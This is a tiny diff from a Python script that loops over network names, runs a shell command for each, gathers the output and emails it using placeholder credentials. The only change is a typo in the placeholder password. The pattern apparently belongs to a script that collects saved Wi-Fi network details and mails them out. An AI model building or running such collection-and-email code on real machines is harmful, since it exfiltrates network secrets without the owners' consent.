@@ -22,4 +22,4 @@ for network_name in network_names_list:
     current_result = subprocess.check_output(command, shell=True)
     result = result + current_result
 
-send_mail("emailhere", "passwordhere", result)
+send_mail("emailhere", "passwordheree", result)
